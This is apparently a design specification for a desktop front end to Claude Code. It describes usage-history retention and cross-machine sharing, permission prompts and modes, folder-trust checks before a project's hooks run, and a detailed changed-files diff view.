**Tab names** (per tab): each tab's last known name, so its rows are still named once it's closed. It's kept when a turn is recorded and whenever the name changes after that, and only for a tab with turn records. Turns and names are written in the order they happen, so a rename just after a turn isn't lost. A name goes when its tab's last turn record does (retention or **Clear usage history**). Turns recorded before names were kept show as "A closed tab".

**Not stored:** prompts, replies, code or any other conversation content. That stays in Claude Code's transcripts and the session library. A tab's name is kept, although it's often the title Claude Code gave the conversation ([§4](#4-tabs--sessions)): it's what the sidebar, History and the session library show. It leaves this machine only with a synced tab's turns, while usage is shared, into the session library that already holds the tab's transcript.

**Retention.** Settings → Usage → **Keep usage history** with these options:

- 1 day
- 1 week
- 1 month (the default)
- 1 year
- Forever

Records older than the chosen period are deleted at launch and once a day. With **1 day**, the weekly chart only covers the last day. The header meters and projection are unaffected, since they only need the current 5-hour window and the latest weekly value.

**Clear usage history.** A button beside the retention option. After confirming, it deletes every stored sample, per-turn record, tab name and other machine's name.

- The header meters fill in again at the next update from Claude Code.
- Each tab's running token totals are kept, because they're saved with the tab ([§4](#4-tabs--sessions)). A checkbox in the confirmation, **Also reset per-tab token totals**, clears those too.
- It's this machine's history only: the usage shared in the session library, and what other machines imported, stay.

**Clear usage history on every machine…** A button under **Share usage with my other machines**, always shown and disabled while sharing is off. After confirming, in place, with **Also reset per-tab token totals on every machine**:

- This machine's history is cleared as above.
- Every machine's shared usage in the library goes: each `usage/<machine id>.json` and every synced session's `usage.json`, with any conflict copies. The sessions themselves stay.
- A note, `usage/cleared.json`, says when, which machine, and whether the tabs' totals were reset. Every machine that shares reads it before it next writes or reads shared usage: within a minute while it runs, or at launch. If it's newer than that machine's own last clear, the machine clears its history up to that moment, keeping what it recorded after, and imports nothing from before it again. It resets its tabs' totals too when the note says so. Until it has, it writes no session's usage, so nothing cleared comes back.
- The setting says how it went: *"Usage history cleared here and in the session library. Your other machines clear theirs the next time they check, within a minute if they're running."*, or, when the library can't be reached, that only this machine's was cleared.
- A machine that doesn't share isn't cleared. It never sees the note until it shares, and then clears what came before it.

Even **Forever** stays small: roughly tens of megabytes a year of heavy use.

### Sharing across machines

✅ Built 2026-09-30. The plan's limits are the account's, so every machine signed in to it sees the same usage, but each machine only charts the readings it took itself, and only counts the turns it ran. **Share usage with my other machines** (Settings → Usage, off by default) fills in the gaps through the session library ([§9](#session-library-sync-across-machines)), so a machine that sat idle still charts the usage another machine ran up, and a project's tokens and estimated cost add up every machine's synced tabs.

- **What's shared:**
  - Plan usage samples (session, weekly and model-specific percentages, their reset times, and when each was taken), from the last 8 days: a week's window and a day to spare.
  - The turns of tabs that sync to the library ([§9](#session-library-sync-across-machines)), in their session's folder: each turn's time, model, tokens, estimated cost, project key and name, tab and machine, and its account (the plan account's hash for Default, or an API-key account's name). Only turns recorded since turns were shared; earlier ones, and tabs that don't sync, stay on their machine.
- **How.** Each machine that shares writes its own samples to `usage/<machine id>.json` in the library: after each sample it saves, at launch, when sharing is turned on and when the library folder changes. The file is written to a temporary name and then renamed, as the library's other files are. The machine id is made up once and kept on the machine, so the file keeps its name when the machine's is changed, and two machines with the same name don't share a file. Nothing is shared live: the SQLite file itself never goes into the library.
- **A synced session's turns** go in `usage.json` in its folder, written with each copy of the session, before its record ([§9](#session-library-sync-across-machines), "Writing"), and only when it gains turns.
  - The machine writing the session puts in every turn it has for it, its own and those it imported, merged with the ones already in the file and in any copy a sync client made of it in a conflict, each once by its id. So a session continued on another machine and back keeps every machine's turns, and a lease held elsewhere only delays this machine's.
  - A file in a format newer than this Claudette reads is left as it is.
- **Reading the others'.** At launch and once a minute, each machine that shares reads the other machines' files and adds their samples to its own history, marked with the machine they came from.
  - Only files from the same account count: each names its account by a hash of the email and organization Claude Code reports, so the email isn't written to the library. An account with no email (an API key) has no plan limits to share.
  - A sample is added once: each machine's newest imported sample is remembered, and only newer ones are added. Samples older than **Keep usage history** aren't added.
  - The header, its trendline and projection, the detailed header's charts and the Usage panel take them in straight away. When the newest sample is newer than this machine's latest reading, the header shows it, as it does after a restart.
  - This machine's own file is never read back, and its shared samples never include ones it imported, so readings don't echo between machines.
- **Reading the others' turns.** At the same times, each machine reads the synced sessions' `usage.json` files that changed since it last read them (all of them at launch) and adds the turns other machines ran, marked with their machine.
  - A turn is added once, by its id; this machine's own are never added back. Turns older than **Keep usage history**, or than the last **Clear usage history**, aren't added. A turn from a machine whose clock is ahead keeps its time.
  - The Default account's turns count only from machines signed in to the same plan account, as samples do. An API-key account's always count, under its name.
  - The Usage panel and the detailed header take them in straight away:
    - **Projects** adds up every machine's turns in a project: the same remote and folder inside it, whatever the folder is called on each. A project only other machines have is named as they name it, with the machine's name beside it when two are named alike. A project without a git remote is a row per machine. A row's tooltip says what each machine spent: *This machine: $3.10 · 12 turns*, *Laptop: $1.20 · 4 turns*.
    - **Tabs in this session window** and the busiest tabs list another machine's tabs as *Fix the loader · Laptop*.
    - **Accounts** counts another machine's API-key turns with this machine's account of the same name (without case or spaces at its ends), or as an account of their own; Default is every machine's plan turns. The tooltip splits it by machine.
  - An API-key account's spend in the header and its warnings ([§4](#accounts)) count other machines' turns under an account of the same name, and are checked again when they're added.
- **Format.** Each file says which format it's in, and the samples file which version of Claudette wrote it (for the log).
  - A change that only adds fields keeps the format, since readers ignore fields they don't know.
  - One that removes a field or changes what one means takes the next format number. A Claudette that doesn't know that number leaves the machine's readings or the session's turns out until it's updated, and says so in its log, rather than guess what they mean.
  - A Claudette keeps reading every format before its own, so machines can be updated one at a time.
- **Clear usage history** deletes imported samples and turns too, and the ones shared up to then aren't imported again. **Clear usage history on every machine** also clears the library's shared usage and, through a note there, every sharing machine's history ([Usage history](#usage-history)).
- Turning sharing off stops writing and reading. The files already in the library stay, as a session's copy does when its tab stops syncing.

## 7. Permission Prompts

- When Claude Code needs permission to use a tool, the tab shows an inline card with:
  - The tool and its input (the command, file path, or a diff preview for edits). A command that asks to run outside the sandbox (`dangerouslyDisableSandbox`) says so in the warning color: it would have the file and network access the sandbox keeps from it.
  - Buttons: **Allow**, **Always allow…** and **Deny**; **Deny with a message…** tells Claude what to do instead.
  - **Always allow…** shows the rule to edit, with **Save rule and allow**, **Allow for this session only** and **Cancel**. Saving it saves an allow rule for that tool and input pattern (for example `Bash(dotnet test:*)`) to the project's `.claude/settings.local.json`. That is Claude Code's personal, uncommitted project settings file, so the rule also applies to terminal sessions in that folder. The rule is sent as part of the permission reply, and Claude Code writes the file itself.
  - The **Always allow…** button has a menu with **Allow for this session only**, which doesn't save anything.
  - Before saving, the card shows the exact rule, and the user can edit it to make it broader or narrower.
- When Claude Code suggests a mode switch instead of a rule (for a file edit it suggests `acceptEdits` for the session), the card offers **Allow all edits this session** in place of **Always allow…**.
- When Claude Code marks a request `suppressAlwaysAllowRule` (the rule would grant more than this request), **Always allow…** isn't offered.
- A prompt from inside a subagent names it (*"Asked by the Explore subagent: Find the auth code"*), and the agent map highlights that subagent ([§18](#agent-map)).
- A prompt answered in the Claude app, on a tab connected with Remote Control, is withdrawn by Claude Code; its card closes and reads *"Answered in the Claude app"* ([§18](#remote-control-the-claude-app)).
- A tab with a waiting prompt gets the "Needs input" status. If Claudette isn't focused or the tab isn't selected, it also sends an OS notification ([§10](#10-notifications)).
- Keyboard: `Ctrl/Cmd+Enter` allows, `Ctrl/Cmd+Backspace` denies the oldest waiting prompt in the tab. On a plan, they pick **Approve, ask before edits** and **Keep planning…**; on a question, `Ctrl/Cmd+Enter` sends the answers once they're all given, and `Ctrl/Cmd+Backspace` dismisses it.
- **Several prompts waiting.** ✅ Built 2026-10-01. Subagents working side by side can leave prompts all through a long conversation. While more than one waits in a tab, each says where it stands, oldest first, as the terminal does since 2.1.286: *"Prompt 2 of 5"*, with **‹** and **›** to go to the one before or after (wrapping round). Prompt 1 is the one the keyboard answers. Answering or withdrawing one numbers the rest again, and the last one alone has no number.
  - Not while typing in one of the prompt's own fields, and `Ctrl/Cmd+Backspace` still deletes a word in a field with text.
  - A request Claude Code marks `defaultToNo` can't be allowed from the keyboard.
- **Permission mode picker** per tab: Manual, Accept edits, Plan, Auto, Bypass permissions. Manual is Claude Code's `default` mode, named as its terminal and VS Code extension name it now.
  - Picking a mode changes it for this session only. The mode a tab starts in comes from Tab settings or Settings → Tabs → **Permission mode**, and without either, from Claude Code ([Starting mode](#starting-mode) below).
  - Auto is offered only while the tab's model supports it (`supportsAutoMode` on the model in the `initialize` reply; Claude Code leaves it out for Haiku) and no settings file Claudette reads sets `disableAutoMode`. Claude Code refuses the switch otherwise ("auto mode unavailable for this model").
  - The picker always shows the mode Claude Code reports, including changes it makes itself (for example after a plan is approved).
  - Bypass needs a confirmation and gives the tab a visible warning style: a red border on the tab and the composer, and a warning line above the composer.
  - Claude Code only allows switching into Bypass in a session that was started with bypass allowed. Claudette doesn't start sessions that way, so the switch is refused unless the tab started in Bypass mode, and the tab says how to do that. Launching every session with `--allow-dangerously-skip-permissions` would lift this, but that's left to a deliberate decision.
- Claude Code's own allow/deny rules in settings still apply; Claudette only shows prompts that Claude Code actually asks for. When a rule or the mode denies a tool without asking (a `permission_denied` message), the conversation shows a note.

**MCP servers asking for input.** An MCP server can ask the user something mid-turn (MCP *elicitation*): Claude Code sends an `elicitation` control request, and the tab shows a card for it, as it does for a permission. The tab waits on the user ("Needs input", with a notification), and `Ctrl/Cmd+Enter` and `Ctrl/Cmd+Backspace` answer it as they do a prompt.

- **A form.** The card shows *"tickets asks"* (or the server's own title), its message, and a field for each property of its schema: a text box for text and numbers, a check box for a yes/no, a list for a choice (`enum`, with `enumNames`, or `oneOf` with titles). Required fields say so; defaults fill them in. **Send** checks each value as the schema says (numbers, ranges, lengths, required) and says what's wrong under the field, or sends `{ "action": "accept", "content": {…} }`.
- **A link** (`mode: "url"`): the card has **Open in browser**, then **Done**. When the server says it's finished (`system/elicitation_complete`), the card closes by itself.
- **Decline** sends `decline`, and **Dismiss** `cancel`. The card then reads what happened (*Sent*, *Done*, *Declined*, *Dismissed*), and one Claude Code withdrew, or that the session's end left unanswered, reads as withdrawn.
- The server's name, message and fields are its own text, shown as text. The utility session (§13) has nobody to ask, so it declines them at once, as the Agent SDKs do without a handler.

**Questions and plans.** Two tools reach Claudette through the same `can_use_tool` request and get their own cards:

- **Clarifying questions** (`AskUserQuestion`): each question with its options (radio buttons, or checkboxes for multi-select) and an "Other" field for the user's own answer.
  - **Send answers** allows the tool with `updatedInput` set to the original `questions` plus `answers`, keyed by question text. Several choices are joined with ", ".
  - **Dismiss** denies it.
  - The card replaces the tool's own row.
- **A plan to approve** (`ExitPlanMode`, in Plan mode): the plan as Markdown, taken from the tool's `plan` input, or else from the draft Claude wrote ([§5](#tasks)). From the session's second plan on, its title says which version it is (*"Claude's plan · v2"*) and **Changes from v1** shows it as a line diff against the one before, and back. The buttons are:
  - **Approve, auto mode**, **Approve, accept edits** and **Approve, ask before edits**. These allow the tool with a `setMode` update to `auto`, `acceptEdits` or `default`, so the session leaves plan mode. **Approve, auto mode** is offered while Auto is, as in the mode picker (below), and is then the main button; otherwise **Approve, accept edits** is.
  - **Keep planning…**, which denies it with optional feedback.
- The real-CLI tests confirmed both against Claude Code 2.1.284.

**How it works** (confirmed by the spike):

- **The request.** Claude Code sends a `can_use_tool` control request with `tool_name`, `input`, `description`, `tool_use_id` and `permission_suggestions`.
- **The suggested rule.** The suggestions include ready-made rules, for example `addRules` with `Bash(touch c.txt)` for `localSettings`, or `setMode: acceptEdits`. The first `addRules` suggestion is the default rule shown on the **Always allow…** card.
- **Allow:** `{ "behavior": "allow", "updatedInput": <input> }`.
- **Always allow…** adds `updatedPermissions: [{ "type": "addRules", "rules": [{ "toolName": "Bash", "ruleContent": "touch:*" }], "behavior": "allow", "destination": "localSettings" }]`. Claude Code then writes `Bash(touch:*)` to `.claude/settings.local.json` itself, and later matching commands don't prompt.
- **Deny:** `{ "behavior": "deny", "message": "<text>" }`.
- **Read-only commands** such as `sleep` never prompt at all.

### Starting mode

✅ Built 2026-09-30. A tab starts in auto mode, like a Claude Code session in a terminal or VS Code, unless something chooses otherwise. Since 2.1.283 auto mode is Claude Code's built-in starting mode there, but not for `claude -p` or the Agent SDK, which start in Manual, and a tab is a `claude -p` session. Since 2.1.285, `claude -p` also starts in auto mode on third-party providers and with telemetry off, when no permission mode is configured, and still in Manual otherwise. So Claudette asks for auto mode itself (`StartingPermissionMode`), which gives the same result either way; `--permission-mode` still overrides Claude Code's choice:

- **Chosen in Claudette:** a mode in Tab settings, else Settings → Tabs → **Permission mode**, is passed with `--permission-mode`, as before.
- **Left to Claude Code** (Settings → Tabs → **Permission mode** → **Claude Code's default**, the default): Claudette reads the settings files Claude Code would, in its precedence order: `managed-settings.json` and its `managed-settings.d` drop-ins, the project's `.claude/settings.local.json` and `.claude/settings.json`, then `settings.json` in Claude Code's config folder.
  - No file sets `permissions.defaultMode`: the tab is launched with `--permission-mode auto`.
  - A file sets it: no flag, and Claude Code applies it, as it does for `-p`. As in a terminal, a project's files can't set `auto` (the built-in default applies instead, so the tab gets auto) or `bypassPermissions` (Manual).
  - A file sets `disableAutoMode` to `"disable"`: no flag, and Auto isn't in the picker. Claude Code would start in Manual anyway.
  - When auto mode turns out to be unavailable (the model doesn't support it, or Anthropic has turned it off), Claude Code starts the session in Manual by itself.
- **A resumed tab** (restored, restarted into a new build, or after a sign-in) isn't given the flag. Without `--permission-mode`, `claude -p --resume` brings back plan mode for a session that ended in it. Once it has started, a tab that came back in Manual is switched to auto with `set_permission_mode`, quietly: if Claude Code refuses, it stays in Manual. The mode picked in the last run isn't restored otherwise, as before.
- **Tab settings → Default** switches back to the starting mode, auto included. Its label names that mode, "Default (Auto)", once the tab has started, and Settings → Tabs names the mode the user's and managed settings give: "Claude Code's default (Auto)".
- Not read: managed settings from MDM, the Windows registry or the claude.ai console, and `--settings` in Settings → Advanced's extra arguments. An organization that sets a starting mode only there still gets auto mode in Claudette's tabs, but `disableAutoMode` from any of them is enforced by Claude Code.

### Folder trust

✅ Built 2026-10-01. In a terminal, Claude Code asks before it works in a folder for the first time, listing what the folder's own configuration would do. A tab is a `claude -p` session, which never shows that dialog ([trust and `-p`](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder)): it runs the folder's hooks, `env` block and helper commands, its skills' hooks and the servers in its `.mcp.json` straight away, without asking. A cloned repository could run anything as its tab starts. So Claudette asks instead, before Claude Code first starts in a folder it hasn't been told to trust (`FolderTrust`).

- **What's listed** is what that session would run or allow from the folder, read as Claude Code reads it:
  - hooks in the folder's `.claude/settings.json` and `.claude/settings.local.json`, by event and matcher, with the command (or the address an HTTP hook sends to);
  - helper commands: `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh`, `otelHeadersHelper`;
  - the names in an `env` block, not the values, which can be secrets;
  - plugins the settings turn on (`enabledPlugins`);
  - project skills with hooks in their frontmatter (`.claude/skills/*/SKILL.md`);
  - servers in a `.mcp.json` in the folder or any folder above it, past the repository's root, as Claude Code finds them (checked with 2.1.286): the command it starts, or the address;
  - allow rules in `.claude/settings.local.json`. The shared file's allow rules aren't listed: a `-p` session leaves them out until the folder is trusted in Claude Code itself.
- **Nothing to list:** the tab starts without asking. A folder that's later given hooks, say by a pull, is asked about at its next start.
- **The card** sits above the composer, where a missing folder's does: *"Trust this folder?"*, what it would run, each with the file that says so, and three choices. The tab's row shows it needs input meanwhile, and a message sent while it asks goes once it's answered.
  - **Trust this folder** starts Claude Code as usual and remembers the folder. Folders inside a trusted one are trusted too.
  - **Start without it** starts Claude Code with `--setting-sources user`: the folder's settings, its `.mcp.json` servers and its `CLAUDE.md` are all left out (checked with 2.1.286), and a note says so. The tab remembers it, and **Trust this folder** in its menu starts the session again with them.
  - **Close tab** (or **Unpin and close**).
- **Which folders are trusted** is this machine's: the state file's list, which doesn't sync. The first launch that knows about trust trusts the folders already used here: open tabs', and the recent and favorite folders.
- **Turning it off:** **Ask before using a new folder's own configuration** (Settings → Claude Code, on by default).
- Claude Code's own trust (`hasTrustDialogAccepted` in `~/.claude.json`) isn't read or written: trusting a folder in Claudette doesn't make a `-p` session apply the shared file's allow rules, which Claude Code still holds back.

## 8. File Changes / Diff View

- The **Changed files** tool window ([Tool windows](#tool-windows)) lists the files changed in the selected tab's session: added, modified or deleted, with `+/−` line counts. It is built from the session's Edit/Write tool calls, live and when a transcript is replayed.
  - The **Files (n)** button in the composer bar opens it.
  - The counts are this session's own: from Claude's "before" to how Claude's latest change left the file, and what changed on disk since, by another tab, you or a command, shows under the row ([This session's changes](#this-sessions-changes)). A file is read and diffed again only when it, or what's known of its changes, has changed since it was last counted, and a tab in the background only keeps its count, listing the files once it's selected.
  - Besides each of Claude's edits, the list looks at the disk again:
    - while the tab is on screen, when a file in it changes on disk, a third of a second after the writing stops: the folders of the files Claude changed are watched (up to 64 of them, each on its own, not its subfolders), and nothing is watched for a tab off screen, which catches up once it's shown;
    - when another tab's Claude changes a file it lists;
    - as each turn ends, for what its commands did, and when Claudette comes back to the front, for what you did meanwhile.
  - `/clear` starts a new conversation, and the list starts again with it: the files from before go, and so do their ticks.
  - A file that's back to how it was shows as unchanged. One whose only change is its line endings, its byte order mark, the newline at its end or whitespace says so ([What the lines don't show](#what-the-lines-dont-show)).
- Clicking a file, or Enter on the selected one, opens a diff view (side-by-side or inline) with syntax highlighting. The arrow keys move through the list without opening anything.
  - The view is a window of its own, so it can stay open beside the conversation.
  - It shows the changes with a few lines of context, or the **Whole file**.
  - Long lines scroll sideways with a scroll bar along the bottom, Shift and the mouse wheel, or a touchpad. Every line scrolls together, both sides at once when they're side by side, and the line numbers stay where they are. The rows scroll up and down as usual.
  - **Wrap lines.** ✅ Built 2026-10-24. A switch in the header beside **Whole file**, off to begin with: on, long lines wrap at the width shown, each side in its half when they're side by side, a line with nowhere to break (a minified file's) too, and nothing scrolls sideways. Each diff, in its window or a Files tab ([Project files](#project-files)), starts as the last one was left (the app state's `DiffWordWrap`).
  - Highlighting uses TextMate grammars, by file extension, with the dark or light theme to match the app. Files over 20,000 lines, and binary files, are shown without it. A line over 1,000 characters, as a minified file's, gets 50 ms and shows the rest in the default color; a shorter line is tokenized whole, since with a budget the first line of a freshly loaded grammar, or any line on a busy machine, could come back half colored.
  - Line endings, a leading byte order mark and the newline at the end aren't counted as changed lines: a note says when they changed, and whitespace shows on a line whose only change is whitespace ([What the lines don't show](#what-the-lines-dont-show)).
- Actions: open in external diff tool, open in external editor (the app the OS uses for that file type), copy path and **Reveal in file manager**, in the Changed files rows' menu and the diff window's. **Open** goes to Claudette's own editor ([Project files](#project-files)) unless Settings → Files and diffs says otherwise, and **Open in the OS's app** stays.
  - The diff window's **Open** goes where Settings → Files and diffs → **Open in the diff window** says: the file as **Open files in** says (the default), the file in the app the OS uses for it, or the changes in the external diff tool, when one is set and there's a "before" to compare (else the file, as **Open files in** says).
  - When the file opens in Claudette's editor, the diff window closes. It belongs to Claudette's window, so it stays in front of it, and would hide the file.
- If the folder is a git repo, a toggle switches to **working tree vs HEAD**. This also shows changes made by Bash commands or by the user.
  - Git is asked once Claude's edits pause (half a second after the last), not once per edit, and a listing a newer one supersedes is stopped. It's asked again as a turn ends, when Claudette comes back to the front, when another tab's Claude changes a file, and when the working tree's own git folder changes (its index and HEAD: staging, commits and checkouts, from a terminal too), which is watched while the tab is on screen. A tab in the background asks git once it's shown.
  - Outside a repository the toggle is hidden and off: a tab moved out of one goes back to Claude's changes.
  - It covers the whole repository, not only the tab's folder, and each other working tree Claude changed files in ([Working trees](#working-trees)).
  - Untracked files count as added.
  - Git runs with `--no-optional-locks`, so refreshing never takes git's index lock.
- **Reviewed.** Each file in the panel has a box to tick once you've reviewed it, in both views. A file has one reviewed state, so ticking it in one view ticks it in the other.
  - A reviewed file is drawn faintly, and the panel's summary counts them: *"5 files changed · 2 reviewed"*. Files back to how they were (**=**) aren't counted in either, and the summary says *"No files changed"* when every file listed is.
  - It stays reviewed until Claude changes the file again with Edit, Write, MultiEdit or NotebookEdit. Changes you make, commands make or another tab's Claude makes don't untick it, so a file only you changed (in working tree vs HEAD) stays reviewed until Claude changes it.
  - The built-in diff view has a **Reviewed** button, which ticks the file and closes the view. It marks the version the view showed: if Claude changed the file while the view was open, the file stays unreviewed. The button shows a check when the file is already reviewed.
  - A tick remembers Claude's latest change to the file by its tool call's id. The id is the same when a transcript is replayed, so ticks survive restoring the tab and opening the session on another machine.
  - Ticks are saved with the tab ([§9](#restore-on-launch)), and in the session record of a tab that syncs, with paths relative to the session's folder ([§9](#session-library-sync-across-machines)). **Start a new session** and `/clear` clear them.
  - Once every file Claude changed is ticked, the tab's row shows the reviewed icon over its mark ([§4](#4-tabs--sessions), "Marks"). Files only you or commands changed, in working tree vs HEAD, don't count, as they don't untick either.
- **Before content.** Claude Code reports it. The result of every Edit and Write tool call (the `tool_use_result` field on the `user` message that carries the tool result) includes:
  - `originalFile`: the file's full content before the change, or `null` for a new file.
  - `structuredPatch`: the change as diff hunks.
- The "before" side of a file's diff is the `originalFile` from Claude's first change to that file in the session, so diffs are exact even outside a git repo. The spike confirmed this in Accept edits mode too. Claudette doesn't snapshot the session's own files, so there's no race with the tool writing the file; a subagent's are read by a hook before the tool runs ([Subagents' changes](#subagents-changes)).
  - A changed file read back from a transcript keeps the time its result was written, not the time it was read.
  - A `user` message has one `tool_use_result`. With several tool results in one message, it goes only to the call whose file it names (`filePath`, or a notebook's `notebook_path`); the others' "before" isn't known from it.
- **Large files in transcripts.** Live, `originalFile` is always the whole file. The transcript (`toolUseResult`) writes it as `null` when it's over 10,000 characters, so a replay can't tell it from a new file (2.1.284; seen in the source and confirmed by `RealCliTests`). Most source files are over that size.
  - So when the first change to a file brings an `originalFile` over 10,000 characters, Claudette saves it in `before-content` in the data folder, compressed, named by the tool call's id. A restored tab, or a session opened again from History, finds it there. Saved content that hasn't been used for 30 days is deleted at launch.
  - An Edit's `null` means a new file only when its `oldString` is empty; otherwise the "before" is unknown, as it is for a Write over a file too large for Claude Code to diff.
  - A file whose "before" is unknown, such as one from a session Claudette didn't run live, is listed as modified, without counts. The diff view shows it as it is now, with nothing marked as changed, and says what it held before isn't known; it opens there even when an external diff tool is set.

### This session's changes

✅ Built 2026-10-24. Several tabs often work in one checkout, and their Claudes change the same files. A file's changes in Changed files are this session's own: from before Claude's first change to it to how Claude's latest change left it, not to the file on disk now, so another tab's edits, yours and a command's don't count as this session's.

- **How the "after" is known.** From each change itself: a Write's content; an Edit's or MultiEdit's strings applied to what it changed (its `originalFile`, or how the session's previous change left the file), and failing that its `structuredPatch`, checked line by line against it; a NotebookEdit's `updated_file`. It's worked out rather than read from the disk, so it's the same live and when the transcript is read back, and another tab writing the file at the same moment can't get into it.
  - A transcript leaves out a large file's `originalFile` ([below](#8-file-changes--diff-view), "Large files in transcripts"), so a large file read back is followed from its saved "before" through each change.
  - Claude Code reports a file with Windows line endings with `\n` in `originalFile` (checked with 2.1.302 and 2.1.308), so the "after" has them too. Comparing lines ignores line endings, a byte order mark and the newline at the end, as the diff view does; changes to them are told apart ([What the lines don't show](#what-the-lines-dont-show)).
  - When it isn't known (an Edit to a file whose "before" isn't known, or one that fits neither its strings nor its patch), the file is counted against the disk, as it was before.
- **Changed since.** When the file on disk isn't as the latest change left it, the row says so under its folder, in the warning color: *"Changed since: +3 −1"*, with *", by Claude in Fix login"* when another open tab's Claude changed the file after (the latest; *"by Claude in Fix login and 1 other tab"* for more), or *"Deleted since"* when it's gone. A file Claude created that's gone again is back to how it was, as before.
- **Changed between.** A change whose `originalFile` isn't how the session's previous change left the file means something else changed it between them. The diff from "before" to "after" has that in it too, and the row's tip says *"Modified, with changes made outside this session between its edits"*.
- **The diff view** of a file changed since ends at the session's latest change, and has no **Revert**, since its right side isn't the file. **With later changes** switches to the file now, with what changed since, and **Revert** as usual.
- **Reviewed** marks stay as they are: what the session did hasn't changed.
- **Turn cards** count each turn from before it to how its last change left the file ([Changes per turn](#changes-per-turn)).
- How it's built: Core's `FileAfter` works out each change's "after"; `ChangedFile` keeps `After`, `AfterKnown` and `ChangedBetween`, and `ChangedFiles.Inspect` gives `ChangedSince`; the shell's `ChangedSinceBy` (`ShellViewModel.ChangedFiles.cs`) names the tab; the diff window's `DiffSource.AgainstNow` is **With later changes**. `FileAfterTests` and `ChangedFilesTests` (Core), `ChangedFilesTrackingTests` (the tab), and `RealCliTests` checks the "after" against what Claude Code wrote, with both line endings.

### Working trees

✅ Built 2026-10-24. A session can change files in more than one working tree of a repository: the tab's own, a worktree Claude moved into and out of ([§4](#worktree-tabs)), one a subagent works in (`isolation: worktree`, which Claude Code makes at `.claude/worktrees/agent-<id>`), or one made with `git worktree add` beside the checkout and edited by its full path.

- **Groups.** Changed files groups its rows by the working tree each file is in: the tab's own first, then the others in the order Claude first changed them. Each group is headed over its first file by its folder and branch, *"brisk-otter · worktree-brisk-otter"*. With only the tab's own there's no heading. A file's path is shown from its working tree's top, and in the tab's own from the tab's folder, as before.
- **A file's working tree** is found from its folder, by reading git's files as the branch badge does: a worktree Claude Code made (`<checkout>/.claude/worktrees/<name>`) is one whether it's there or not; otherwise git's from the nearest folder that's there. It's found once while the folder is there, and kept for the tab.
- **The working tree view** asks git in the tab's working tree and in each other one Claude changed files in that's still there, and groups them the same way. A file's HEAD copy comes from its own.
- **A removed worktree's files** stay together under *"brisk-otter · removed"*, with Claude's changes as they were rather than as deleted, and their tip says *"Modified, in a worktree that's gone"* (*"Added, in a worktree that's gone"* for a file Claude created there). Their diff shows the session's change, from before its first change to how its last left the file. **Open** isn't offered.
- A worktree a tab's session changed files in counts as in use, so cleaning up worktrees leaves it ([§4](#cleaning-up-worktrees)).
- How it's built: `ChangedFilesViewModel.WorkTrees.cs` finds each file's working tree (`FindWorkTree`, with Core's `GitInfo.TryGetWorkTree`) and groups the rows (`InGroups`, with each row's `WorkTree` and `Group`); `SessionPagesView` heads each group's first row. `ChangedFilesWorkTreesTests` (the tab, with git's folders written by hand: `FakeGitFolders`) and `ToolWindowsUiTests`.

### Subagents' changes

✅ Built 2026-10-24. A subagent's Edit and Write come with no `tool_use_result`, live or in its transcript (`subagents/agent-<id>.jsonl`; checked with 2.1.302 and 2.1.308), so neither says what the file held before, and the path the model gave may be relative to the subagent's folder. Every tab registers a PreToolUse hook on `Edit|Write|MultiEdit|NotebookEdit`, which Claude Code calls for a subagent's calls too, with its `agent_id`, the call's `tool_use_id` and the file's real path, and waits for before it runs the tool.

- For a subagent's call, the hook reads the file as the call finds it: its text, or that it isn't there yet. That's the change's "before", and its real path, and what Claudette works out it left follows from them ([This session's changes](#this-sessions-changes)). The session's own calls report theirs, so for them the hook reads only the file's line endings, which their `originalFile` doesn't have ([What the lines don't show](#what-the-lines-dont-show)).
- A file a subagent changes first has what the hook read kept in `before-content`, whatever its size (a marker when the file wasn't there), so a restored tab, or the session opened from History, finds it again; its later changes follow from it.
- A file the hook can't read (binary, or over the size Changed files counts) has an unknown "before", as before.
- How it's built: `ChangedFilesViewModel.BeforeHook` reads the file (`ChangedFiles.ReadFromDisk`) and hands it to `ChangedFiles.NoteBefore` on the UI thread before answering; `BeforeContentStore.SaveMissing` is the marker. `ChangedFilesTests` (Core), `ChangedFilesTrackingTests` (the tab), and `RealCliTests` and `ProtocolRecordingTests` against the real `claude`.

### What the lines don't show

✅ Built 2026-10-24. The diff compares lines, so a file whose line endings, byte order mark or newline at the end changed looks the same on both sides, and so does a line whose only change is whitespace. Changed files listed such a file as modified with `+0 −0`, or as back to how it was, and its diff showed nothing; an Edit to a file with a byte order mark showed *"Changed since: +0 −0"*. Now each says what changed.

- **What Claude Code does** (checked with 2.1.302 against a scripted mock): a Write writes its content as the model gave it, with `\n`, so it turns a file with Windows line endings into Unix ones, and one with the same text leaves `structuredPatch` empty. An Edit keeps a file's CRLF, and turns mixed line endings into CRLF. `originalFile` comes with `\n` for a file with Windows line endings, but keeps a byte order mark (as a leading `﻿`) and the newline at the end as the file had them. Claude Code keeps the mark on disk, and a Write's result `content` starts with it though the model's didn't.
- **Comparing.** Lines are compared as the diff shows them (`FileAfter.Same`): line endings, a byte order mark and the newline at the end aside. Claudette reads a file with its byte order mark as a leading `﻿`, as `originalFile` has it, so the two compare alike and a mark added or removed can be told. A file is unchanged (**=**) only when its lines are the same and nothing below changed either.
- **The line endings before.** Since `originalFile` doesn't have them, the PreToolUse hook on the file tools ([Subagents' changes](#subagents-changes)) reads the file's line endings before each of the session's own calls runs, as it reads a subagent's whole file. A first change's are kept in `before-content` (`<id>.eol`), so a restored tab tells them too. A session Claudette didn't run live, or ran before this, doesn't have them, and a change to its line endings isn't told.
- **The line endings after** are the file's on disk, while it's as the session's latest change left it; otherwise they aren't told. The byte order mark and the newline at the end are the "after"'s ([This session's changes](#this-sessions-changes)).
- **On the row.** A muted line under the folder, above any *Changed since*: *"Only its line endings changed: CRLF to LF"* when no line changed, in place of `+0 −0`, and *"Its line endings changed too: CRLF to LF"* when lines did. The same for *its byte order mark* (*added* or *removed*), *the newline at its end*, and *whitespace* (*"Only whitespace changed"*: lines that are the same with their whitespace taken out). Several at once read *"Only its line endings (CRLF to LF) and the newline at its end (removed) changed"*. Such a file is modified, and counts in the summary.
- **In the diff view.** When no line changed, it says what did in place of the lines (*"Only its line endings changed: CRLF to LF. The lines are the same on both sides."*), and the header's counts say *CRLF → LF*. When lines changed too, the note is under the path. On a changed line whose only change is whitespace, paired with the line it replaces as side by side pairs them, spaces show as `·` and tabs as `→`, in a faint gray, and the note says so.
- **Modified files.** A tile whose turn changed no line shows what did in place of `+0 −0` (*CRLF → LF*, *whitespace*, *byte order mark*, *newline at end*), and its tip adds the row's sentence.
